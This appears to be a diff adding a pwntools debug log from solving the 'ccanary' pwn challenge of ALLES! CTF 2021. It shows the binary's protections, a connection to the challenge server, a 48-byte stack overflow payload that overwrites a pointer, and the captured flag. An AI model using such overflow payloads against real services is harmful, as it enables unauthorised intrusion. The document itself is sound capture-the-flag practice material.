@@ -1,0 +1,39 @@
+mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ python solve.py r
+[DEBUG] PLT 0x102c puts
+[DEBUG] PLT 0x1040 __stack_chk_fail
+[DEBUG] PLT 0x1050 system
+[DEBUG] PLT 0x1060 printf
+[DEBUG] PLT 0x1070 memset
+[DEBUG] PLT 0x1080 fgetc
+[DEBUG] PLT 0x1090 setvbuf
+[*] '/home/mito/CTF/ALLES!_CTF_2021/Pwn_ccanary/ccanary'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/bin/sh' argv=['ncat --ssl 7b0000007c7be7ad4dab5be5-ccanary.challenge.master.allesctf.net 31337'] : pid 60037
+[DEBUG] Received 0x7 bytes:
+    'quote> '
+[*] Paused (press any to continue)
+[DEBUG] Sent 0x30 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 00  │AAAA│AAAA│AAAA│AAA·│
+    00000020  04 60 ff ff  ff ff ff 01  00 00 00 00  00 00 00 0a  │·`··│····│····│····│
+    00000030
+[*] Switching to interactive mode
+[DEBUG] Received 0xa bytes:
+    'good birb!'
+good birb![DEBUG] Received 0x34 bytes:
+    '\n'
+    '\n'
+    '"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
+    "Here's the flag:\n"
+
+
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Here's the flag:
+[DEBUG] Received 0x30 bytes:
+    'ALLES!{th1s_m1ght_n0t_work_on_y0ur_syst3m_:^)}\n'
+    '\n'
+ALLES!{th1s_m1ght_n0t_work_on_y0ur_syst3m_:^)}
